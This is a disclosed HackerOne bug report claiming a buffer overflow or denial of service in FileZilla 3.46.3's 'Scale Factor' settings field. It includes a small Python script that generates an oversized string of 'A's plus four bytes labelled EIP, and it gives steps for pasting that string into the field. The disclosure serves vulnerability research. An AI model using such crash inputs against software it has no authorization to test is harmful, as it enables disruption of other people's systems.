# FileZilla 3.46.3 - 'Scale factor' Buffer Overflow

## Report Details
- **Report ID**: 798301
- **URL**: https://hackerone.com/reports/798301
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-02-17T21:45:57.727Z
- **Disclosed**: 2020-11-21T18:19:42.483Z

## Reporter
- **Username**: ayson88
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: filezilla

## Vulnerability Information
## Summary:
FileZilla in has a problem in the "Scale Factor" field is vulnerable to a Buffer Over Flow attack or a denial attack. Adding random characters in an entry that must accept only Float input type values.

## Steps To Reproduce:
A python file of name generatepaste.py was generated for the generation of the chain that allows the overflow, which is the following:

buffer = "\x41" * 5000000
eip= "\x42" * 4
f = open ("generate.txt", "w")
f.write(buffer+eip)
f.close()

  1.- Run python code : python generatepaste.py
  2.- Open generate.txt and copy content to clipboard.
  3.- Open FileZilla.
  4.- Select the Edit menu and then Settings.
  5.- Find the Interface section and select Themes.
  6.- Paste Clipboard on "Scale Factor" three times.
  7.- Click in the icons.
  8.- BoF


## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]
F719632

## Impact

An attacker can corrupt FileZilla applications and be a preamble to a much more severe attack.

## Attachments
- Captura.JPG
